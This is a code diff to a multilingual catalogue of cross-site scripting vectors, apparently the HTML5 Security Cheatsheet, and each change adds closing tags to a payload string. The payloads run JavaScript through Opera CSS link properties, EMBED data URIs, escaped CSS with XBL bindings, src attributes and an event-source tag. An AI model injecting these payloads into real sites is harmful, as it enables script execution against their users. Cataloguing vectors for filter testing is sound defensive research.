@@ -330,7 +330,7 @@ var items =
             'tr' : 'Opera link-source özelliğinden yararlanarak CSS ile JavaScript çalıştırma',
             'zh' : '使用Opera的CSS属性link-source执行javascript'
         },
-        'data'       : '<a style="-o-link:\'%js_uri_alert%\';-o-link-source:current">X',
+        'data'       : '<a style="-o-link:\'%js_uri_alert%\';-o-link-source:current">X</a>',
         'description': {
             'en' : 'Opera allows setting link sources for arbitrary HTML elements - making them clickable and execute JavaScript. Note that Opera 11 requires an actual <a> tag to have this work - while earlier versions work with other tags too.',
             'ja' : 'Opera\u306f\u4efb\u610f\u306eHTML\u8981\u7d20\u306b\u3001\u30af\u30ea\u30c3\u30af\u3057\u3066\u5b9f\u884c\u3067\u304d\u308bJavaScript\u3092\u542b\u3081\u308b\u3053\u3068\u306e\u3067\u304d\u308blink\u30bd\u30fc\u30b9\u306e\u8a2d\u5b9a\u3092\u8a31\u3057\u3066\u3044\u308b\u3002',
@@ -1829,7 +1829,7 @@ var items =
             'cs' : 'Spuštění JavaScriptu použitím atributu SRC tagu <EMBED>',
             'de' : ''
         },
-        'data'       : '<embed src="data:text/html;base64,%js_base64_alert%">',
+        'data'       : '<embed src="data:text/html;base64,%js_base64_alert%"></embed>',
         'description': {
             'en' : 'Almost all browsers supporting data URIs allow executing JavaScript via crafted <EMBED> "src" attribute value - even if base64 dencoded. Only Firefox attempts to search for a plugin handler and fails.',
             'ja' : '',
@@ -2175,7 +2175,7 @@ var items =
             'cs' : 'Kódování a escapování znaků v CSS',
             'de' : ''
         },
-        'data'       : '<a x="javasc&#x0Aript:%js_alert%" style="\\000062\\00065\\68\\0\\00	\\&#xA0\\000061 vio\\r:url\\28#default#time2);\\-\\\n\\\n\\00006D\\0006f\\7A\\2d \\62	\\000069 \\06E din\\g:url(%xbl_path%#xss);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B:attr(x);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B-s\\ource:current" end=0 onend=%js_alert%>XXX',
+        'data'       : '<a x="javasc&#x0Aript:%js_alert%" style="\\000062\\00065\\68\\0\\00	\\&#xA0\\000061 vio\\r:url\\28#default#time2);\\-\\\n\\\n\\00006D\\0006f\\7A\\2d \\62	\\000069 \\06E din\\g:url(%xbl_path%#xss);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B:attr(x);\\-\\00006F\\0002d\\6C\n\\69 \\6e	\\00006B-s\\ource:current" end=0 onend=%js_alert%>XXX</a>',
         'attachment' : {
             'required_mime' : '',
             'crossdomain'    : '0',            
@@ -2248,7 +2248,7 @@ var items =
             'cs' : 'Spuštění JavaScriptu prostřednictvím atributu src',
             'de' : ''
         },
-        'data'       : '<embed src="%js_uri_alert%">\r\n<img src="%js_uri_alert%">\r\n<image src="%js_uri_alert%">\r\n<script src="%js_uri_alert%">',
+        'data'       : '<embed src="%js_uri_alert%"></embed>\r\n<img src="%js_uri_alert%">\r\n<image src="%js_uri_alert%">\r\n<script src="%js_uri_alert%"></script>',
         'description': {
             'en' : 'Most browsers allow executing JavaScript via <IFRAME> "src" attributes - this is expected behavior. Interesting is though that this can be extended to other tags too. Opera 10, Chrome and Firefox execute JavaScript by using the <EMBED> tag while Opera 10 and Opera Mobile even execute JavaScript with <SCRIPT>, <IMG> and <IMAGE> and a matching "src" attribute as well as early Internet Explorer versions.',
             'ja' : '',
@@ -2629,7 +2629,7 @@ var items =
             'cs' : 'Server-sent událost - Opera a tag <EVENT-SOURCE> (2)',
             'de' : ''
         },
-        'data'       : '<a href="%js_uri_alert%"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A">',
+        'data'       : '<a href="%js_uri_alert%"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A" /></a>',
         'description': {
             'en' : 'Opera allows using <EVENT-SOURCE> tags to receive server-sent events. In this example a data URI is being used as an event source triggering a click on another HTML element. In an attack scenario an XSS requiring user interaction can be turned into an active script execution this way.',
             'ja' : '',
